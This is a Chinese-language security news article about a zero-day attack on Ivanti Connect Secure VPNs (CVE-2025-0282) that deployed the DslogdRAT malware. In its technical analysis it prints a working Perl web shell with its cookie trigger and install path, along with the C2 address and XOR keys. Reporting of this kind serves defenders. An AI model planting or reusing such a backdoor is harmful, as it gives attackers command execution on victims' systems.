#  【安全圈】零日漏洞引发危机：黑客利用 Ivanti VPN 发动 DslogdRAT 恶意攻击   
 安全圈   2025-04-26 11:01  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aBHpjnrGylgOvEXHviaXu1fO2nLov9bZ055v7s8F6w1DD1I0bx2h3zaOx0Mibd5CngBwwj2nTeEbupw7xpBsx27Q/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
**关键词**  
  
  
  
零日漏洞  
  
  
近期针对日本组织的攻击事件表明，有技术高超的黑客利用了 Ivanti Connect Secure VPN 设备中的一个零日漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aBHpjnrGylhoDkR6o8VKsAWeSYy1RI52d9bu5RxpEpcMqPjJrhDbTGHhjIYtulf6NMBNvAbELB1yefs2HWB1kg/640?wx_fmt=png&from=appmsg "")  
  
攻击者利用 CVE-2025-0282 漏洞部署了多种恶意工具，其中包括一种名为 DslogdRAT 的定制恶意软件以及一个精心制作的网页后门。  
  
这些工具使攻击者能够持续访问被攻陷的系统，并远程执行任意命令。  
  
威胁行为者通过将零日漏洞利用与定制恶意软件部署技术相结合，展示出了高超的攻击能力。  
  
在攻陷 VPN 设备后，攻击者安装了一个基于 Perl 语言的网页后门，以此作为初始立足点，进而能够部署包括 DslogdRAT 在内的更多恶意软件组件。  
  
这种多阶段的攻击方式显示出攻击者在针对安全网络基础设施时经过了有条不紊的策划，且具备较高的技术水平。  
  
JPCERT 的分析师发现，DslogdRAT 恶意软件设计有特定的逃避检测功能，特别是它仅在上午 8 点到晚上 8 点的工作时间内运行。  
  
这种经过精心算计的攻击方式帮助攻击者将恶意流量与合法的业务操作相融合，在保持对被攻陷环境持续访问的同时，大幅降低了被检测到的可能性。  
  
除了 DslogdRAT，研究人员还在同样被攻陷的系统中发现了另一种名为 SPAWNSNARE 的恶意软件变种，这表明这是一次经过协同且资源充足的攻击行动。  
  
Google 和 CISA 此前在 2025 年 4 月都曾报告过类似的攻击活动，这表明针对 Ivanti 产品的攻击仍在持续。  
  
安全专家警告称，这些攻击代表着一种持续存在的威胁，Ivanti Connect Secure 产品依然是高价值的攻击目标。  
  
该供应商最近已修复了另一个严重漏洞（CVE-2025-22457），但相关组织仍被敦促保持警惕，因为预计攻击还会继续。  
  
**DslogdRAT 的技术分析**  
  
DslogdRAT 采用了一种复杂的执行流程，旨在逃避检测机制。在执行时，该恶意软件的主进程会在立即终止自身之前创建一个子进程。  
  
随后，第一个子进程会对经过异或（XOR）加密的配置数据进行解码（使用 0x63 作为密钥），并生成包含核心功能的第二个子进程。  
  
这种进程隔离技术有助于绕过那些监控单进程行为，或者在父进程结束时就会终止检测的安全解决方案。  
  
攻击者最初是通过部署在 “/home/webserver/htdocs/dana-na/cc/ccupdate.cgi” 的一个看似简单但却有效的基于 Perl 语言的网页后门获得访问权限的。  
  
这个 Web Shell 代码揭示了攻击者是如何建立初始立足点的：  
  
use CGI; my $cookie_str = $ENV{HTTP_COOKIE};  
  
if($cookie_str =~ /DSAUTOKEN=([^;]+)/) {  
  
if($1 eq ‘af95380019083db5’) {  
  
print CGI:: header( -type => ‘text/html’ );  
  
my $data = CGI::param(‘data’);  
  
system($data);  
  
exit(0);  
  
}  
  
}  
  
这段代码允许攻击者只需发送带有特定 cookie 值 “DSAUTOKEN=af95380019083db5” 的 HTTP 请求，并在 “data” 参数中包含要运行的命令，就可以执行任意命令。  
  
这个后门的简单性凸显了这样一个事实：即使是简单的代码，在被部署到关键基础设施中时，也可能造成严重的安全漏洞。  
  
DslogdRAT 与其命令控制服务器（3.112.192.119:443）之间的通信使用了一种定制的编码机制。  
  
所交换的数据会使用一种简单的异或操作进行混淆处理，该操作会以 7 字节为一块，按照轮换模式应用从 0x01 到 0x07 的密钥。  
  
这种技术虽然不是非常复杂，但足以提供足够的混淆效果，以避免基本的网络流量分析，同时支持包括文件传输、Shell 命令执行和代理功能在内的多种命令功能。  
  
  
  END    
  
  
阅读推荐  
  
  
[【安全圈】NVIDIA NeMo 框架三大高危漏洞致远程攻击与数据篡改风险剧增](https://mp.weixin.qq.com/s?__biz=MzIzMzE4NDU1OQ==&mid=2652069278&idx=1&sn=438c2449a1c0f61060e790d949b847cc&scene=21#wechat_redirect)  
  
  
  
[【安全圈】Kubernetes 集群安全漏洞遭利用，算力资源面临严重危机](https://mp.weixin.qq.com/s?__biz=MzIzMzE4NDU1OQ==&mid=2652069278&idx=2&sn=1de49835dbc9a027714f7dd639995399&scene=21#wechat_redirect)  
  
  
  
[【安全圈】警报！57% 电商流量被机器人操控，AI 攻击重塑网络安全格局](https://mp.weixin.qq.com/s?__biz=MzIzMzE4NDU1OQ==&mid=2652069278&idx=3&sn=245e3417a89ff97505222561a21934f1&scene=21#wechat_redirect)  
  
  
  
[【安全圈】微软的符号链接补丁造成了新的 Windows DoS 漏洞](https://mp.weixin.qq.com/s?__biz=MzIzMzE4NDU1OQ==&mid=2652069278&idx=4&sn=65b96c2d3c069f56a8cea6f42de7bddd&scene=21#wechat_redirect)  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCEft6M27yliapIdNjlcdMaZ4UR4XxnQprGlCg8NH2Hz5Oib5aPIOiaqUicDQ/640?wx_fmt=gif "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCEDQIyPYpjfp0XDaaKjeaU6YdFae1iagIvFmFb4djeiahnUy2jBnxkMbaw/640?wx_fmt=png "")  
  
**安全圈**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCEft6M27yliapIdNjlcdMaZ4UR4XxnQprGlCg8NH2Hz5Oib5aPIOiaqUicDQ/640?wx_fmt=gif "")  
  
  
←扫码关注我们  
  
**网罗圈内热点 专注网络安全**  
  
**实时资讯一手掌握！**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCE3vpzhuku5s1qibibQjHnY68iciaIGB4zYw1Zbl05GQ3H4hadeLdBpQ9wEA/640?wx_fmt=gif "")  
  
**好看你就分享 有用就点个赞**  
  
**支持「****安全圈」就点个三连吧！**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCE3vpzhuku5s1qibibQjHnY68iciaIGB4zYw1Zbl05GQ3H4hadeLdBpQ9wEA/640?wx_fmt=gif "")  
  
  
